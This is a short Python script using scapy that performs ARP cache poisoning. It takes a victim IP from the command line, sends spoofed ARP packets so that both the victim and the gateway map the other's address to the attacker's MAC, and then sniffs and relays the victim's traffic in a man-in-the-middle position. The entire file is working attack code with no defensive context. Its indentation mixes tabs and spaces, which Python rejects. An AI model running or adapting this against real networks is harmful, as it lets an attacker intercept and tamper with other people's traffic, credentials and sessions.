import sys
import time
from scapy.all import *

# get gw ip
def get_gw_addr():
	route = conf.route.routes
	for info in route:
		if info[2] != "0.0.0.0":
			return info[2]

# get victim mac
def get_vic_mac():
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[1],op=1)
	ans,unans = srp(pkt, timeout=2)
	return ans[0][1]['ARP'].hwsrc

# get gw mac
def get_gw_mac():
	pkt = Ether()/ARP(pdst=get_gw_addr(), op=1)
	ans,unans = srp(pkt)
	return ans[0][1]['ARP'].hwsrc

# get my-pc ip & mac
def get_my_info():
        pkt = Ether()/ARP(pdst=get_gw_addr(), op=1)
        ans,unans = srp(pkt)
	return ans[0][0]['ARP'].psrc, ans[0][0]['ARP'].hwsrc

# send spoofed arp packet to victim & gw
def send_poison(vic_ip,gw_ip,my_mac):
	pkt = Ether()/ARP(pdst=vic_ip, psrc=gw_ip, hwsrc=my_mac, op=1)
	ans,unans = srp(pkt)
	pkt = Ether()/ARP(pdst=gw_ip, psrc=vic_ip, hwsrc=my_mac, op=1)
        ans,unans = srp(pkt)

def arp_monitor(pkt):
        gw_ip   = get_gw_addr()
        gw_mac  = get_gw_mac()
        vic_ip  = sys.argv[1]
        vic_mac = get_vic_mac()
        my_ip,my_mac = get_my_info()

	pkt['Ether'].dst = vic_mac
        pkt['Ether'].src = my_mac

        if ARP in pkt:
                send_poison(vic_ip, gw_ip, my_mac)

	if pkt.haslayer(UDP):
                del pkt['UDP'].chksum
                del pkt['UDP'].len

        if pkt.haslayer(IP):
                if pkt['IP'].dst == vic_ip:
                        del pkt['IP'].chksum
                        del pkt['IP'].len
                elif pkt['IP'].src == vic_ip:
                        del pkt['IP'].chksum
                        del pkt['IP'].len
			send(fragment(pkt,1024))
	else:
		sendp(pkt)


while 1:
        sniff(prn=arp_monitor, filter="host "+sys.argv[1], count=1)


